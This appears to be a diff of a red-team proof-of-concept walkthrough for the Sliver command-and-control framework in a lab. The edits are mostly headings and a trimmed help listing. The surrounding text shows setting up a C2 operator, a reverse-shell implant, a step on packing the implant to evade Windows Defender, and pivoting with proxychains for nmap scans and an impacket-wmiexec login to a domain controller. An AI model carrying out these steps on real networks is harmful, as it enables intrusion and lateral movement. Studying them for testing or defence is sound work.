@@ -89,6 +89,7 @@ Setting up build-essential (12.9) ...
 Setting up sliver (1.5.31-0kali1) ...                                                                                                                      
 Processing triggers for kali-menu (2021.2.1) ...  
 
+
 =====================================================================================================================
 PoC - Step 2 - Start the SLIVER server and create an operator on the Kali Linux box
 =====================================================================================================================
@@ -120,49 +121,7 @@ All hackers gain conspire
 
 [server] sliver > help
 
-Commands:
-=========
-  clear       clear the screen
-  exit        exit the shell
-  help        use 'help [command]' for command help
-  monitor     Monitor threat intel platforms for Sliver implants
-  wg-config   Generate a new WireGuard client config
-  wg-portfwd  List ports forwarded by the WireGuard tun interface
-  wg-socks    List socks servers listening on the WireGuard tun interface
-
-Generic:
-========
-  aliases           List current aliases
-  armory            Automatically download and install extensions/aliases
-  background        Background an active session
-  beacons           Manage beacons
-  builders          List external builders
-  canaries          List previously generated canaries
-  cursed            Chrome/electron post-exploitation tool kit (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ
-  dns               Start a DNS listener
-  env               List environment variables
-  generate          Generate an implant binary
-  hosts             Manage the database of hosts
-  http              Start an HTTP listener
-  https             Start an HTTPS listener
-  implants          List implant builds
-  jobs              Job control
-  licenses          Open source licenses
-  loot              Manage the server's loot store
-  mtls              Start an mTLS listener
-  prelude-operator  Manage connection to Prelude's Operator
-  profiles          List existing profiles
-  reaction          Manage automatic reactions to events
-  regenerate        Regenerate an implant
-  sessions          Session management
-  settings          Manage client settings
-  stage-listener    Start a stager listener
-  tasks             Beacon task management
-  update            Check for updates
-  use               Switch the active session or beacon
-  version           Display version information
-  websites          Host static content (used with HTTP C2)
-  wg                Start a WireGuard listener
+<SNIP>
 
 Multiplayer:
 ============
@@ -190,8 +149,8 @@ Creation of the new-operator 'jeff' and activation of the "multiplayer" mode
 [*] jeff has joined the game
 
 
-Commands to join the SLIVER C2 server as 'jeff' client
---------------------------------------------------------
+Commands to join the SLIVER C2 server as 'jeff' with the SLIVER client
+-----------------------------------------------------------------------
 jeff@kali:~/.sliver-client/configs$ sudo chown -R jeff:jeff /home/jeff/.sliver-client/configs && chmod 764 /home/jeff/.sliver-client
 
 jeff@kali:~/.sliver-client/configs$ sliver-client
@@ -318,6 +277,7 @@ Sub Commands:
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ sudo chmod 777 SliverRevShell1.exe 
 
+
 ====================================================================================================================================================
 PoC - Step 5 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
 ====================================================================================================================================================
@@ -407,7 +367,6 @@ socks5  127.0.0.1 1081
 PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session to pivot into the network '192.168.1.0/24'
 ============================================================================================================================================
 
-
 without using Proxychains and the SLIVER tunnel the network connection are filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -429,8 +388,8 @@ PORT     STATE    SERVICE
 Nmap done: 2 IP addresses (2 hosts up) scanned in 13.09 seconds
 
 
-Example 1 - Nmap port scan of the Windows machines '192.168.1.113' and '192.168.1.167' over the SLIVER tunnel
----------------------------------------------------------------------------------------------------------------
+Example 1 - Nmap port scan of the Windows machines '192.168.1.113' and '192.168.1.167' (from the KALI VM) over the SLIVER session
+---------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ proxychains nmap -Pn -sT -p 3389 192.168.1.113,167
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -453,8 +412,8 @@ PORT     STATE SERVICE
 Nmap done: 2 IP addresses (2 hosts up) scanned in 13.14 seconds
 
 
-Example 2 - WMIexec (impacket) connection to the Windows DC 2016 (192.168.13.167) from the Kali linux over the SLIVER tunnel
------------------------------------------------------------------------------------------------------------------------------
+Example 2 - WMIexec (impacket) connection to the Windows DC 2016 (192.168.13.167) from the Kali VM over the SLIVER session
+---------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/SLiver-C2$ proxychains impacket-wmiexec company.work/chuck.norris.adm@192.168.1.167
 ProxyChains-3.1 (http://proxychains.sf.net)
